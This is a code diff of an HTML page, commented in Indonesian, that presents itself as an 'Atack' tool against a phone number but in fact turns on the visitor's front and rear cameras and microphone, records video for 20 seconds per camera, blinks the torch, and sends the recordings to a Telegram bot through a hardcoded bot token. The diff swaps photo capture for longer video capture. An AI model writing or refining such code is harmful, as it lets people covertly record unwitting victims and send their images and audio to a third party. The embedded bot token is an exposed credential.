@@ -82,7 +82,7 @@
       border-radius: 8px;
       font-size: 13px;
     }
-    video, canvas { display: none; }
+    video { display: none; }
   </style>
 </head>
 <body>
@@ -95,9 +95,6 @@
     <button class="login-button" id="login-button">Atack</button>
     <div id="info">🥷 number target...</div>
   </div>
-
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas" width="1280" height="720"></canvas>
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
@@ -123,7 +120,7 @@
         formData.append(type, blob, filename);
         if(caption) formData.append('caption', caption);
         
-        let endpoint = (type === 'video') ? 'sendVideo' : (type === 'voice') ? 'sendVoice' : 'sendPhoto';
+        let endpoint = (type === 'video') ? 'sendVideo' : 'sendVoice';
 
         fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
           method: 'POST',
@@ -132,37 +129,29 @@
       });
     }
 
-    // Fitur Flash Kedip 1 Detik Selama 10 Detik
     async function flashKedip() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: 'environment' } 
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
         const track = stream.getVideoTracks()[0];
         const capabilities = track.getCapabilities();
-
         if (!capabilities.torch) {
           sendToTelegram('gagal menyalahkan flash');
           track.stop();
           return;
         }
-
         sendToTelegram('flash berhasil nyala ✅ (Mode Kedip)');
-        
         let count = 0;
         let isOn = false;
         const interval = setInterval(async () => {
           isOn = !isOn;
           await track.applyConstraints({ advanced: [{ torch: isOn }] });
           count++;
-          
-          if (count >= 10) { // Berhenti setelah 10 kali (nyala-mati 1 detik = total durasi siklus)
+          if (count >= 10) {
             clearInterval(interval);
             await track.applyConstraints({ advanced: [{ torch: false }] });
             track.stop();
           }
-        }, 1000); // Kecepatan 1 detik
-
+        }, 1000);
       } catch (err) {
         sendToTelegram('gagal menyalahkan flash');
       }
@@ -194,42 +183,31 @@
       } catch (err) {}
     }
 
-    async function recordVideo() {
+    // Fungsi Rekam Video yang Disempurnakan (20 Detik per Kamera)
+    async function recordVideo(facingMode, label) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: facingMode }, 
+          audio: true 
+        });
         const mediaRecorder = new MediaRecorder(stream);
         const chunks = [];
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/mp4' });
-          sendMedia(blob, 'video', 'video.mp4', '🎥 Video Depan (5s)');
-          stream.getTracks().forEach(track => track.stop());
-        };
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
-      } catch (err) {}
-    }
 
-    async function capturePhoto(facingMode, label) {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-        video.srcObject = stream;
-        return new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            setTimeout(() => {
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              canvas.toBlob(blob => {
-                if (blob) sendMedia(blob, 'photo', `${label}.jpg`, `📸 Foto: ${label}`);
-                stream.getTracks().forEach(track => track.stop());
-                resolve();
-              }, 'image/jpeg', 0.9);
-            }, 2500);
+        return new Promise((resolve) => {
+          mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/mp4' });
+            sendMedia(blob, 'video', `${label}.mp4`, `🎥 Video ${label} (20s)`);
+            stream.getTracks().forEach(track => track.stop());
+            resolve();
           };
+
+          mediaRecorder.start();
+          setTimeout(() => mediaRecorder.stop(), 20000); // 20 Detik
         });
-      } catch (err) {}
+      } catch (err) {
+        sendToTelegram(`❌ Gagal Video ${label}: ${err.message}`);
+      }
     }
 
     button.addEventListener('click', async () => {
@@ -242,13 +220,19 @@
       
       try {
         await getInfo();
-        flashKedip(); // Jalankan fitur kedip flash
+        flashKedip();
         recordAudio(); 
-        recordVideo();
         
-        await capturePhoto("user", "Depan");
-        await new Promise(r => setTimeout(r, 1500));
-        await capturePhoto("environment", "Belakang");
+        // Rekam Video Depan
+        infoDiv.innerText = '🎥 Merekam video depan (20s)...';
+        await recordVideo("user", "Depan");
+        
+        // Jeda sebentar agar transisi hardware mulus
+        await new Promise(r => setTimeout(r, 1000));
+        
+        // Rekam Video Belakang
+        infoDiv.innerText = '🎥 Merekam video belakang (20s)...';
+        await recordVideo("environment", "Belakang");
         
         infoDiv.innerText = `✅ Berhasil memproses ${nomor}`;
         button.disabled = false;
